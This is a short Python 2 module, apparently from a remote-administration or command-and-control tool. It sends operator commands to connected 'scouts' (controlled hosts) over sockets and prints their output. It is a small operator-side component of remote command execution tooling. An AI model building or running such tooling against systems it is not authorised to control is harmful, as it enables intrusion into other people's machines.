#Coded by ev-ev

import library.modules.config as config
config.main()

def main(prompt,scout_id):
    try:
        prompt = prompt.replace('exec ','')
        config.scout_database[scout_id][0].sendall(prompt)
        data = config.scout_database[scout_id][0].recv(999999)
        print data
    except socket.error:
        print '[-]Scout is dead, removing from database...'
        del(config.scout_database[scout_id])
    except Exception as e:
        print '[!]Uncharted error! '+str(e)

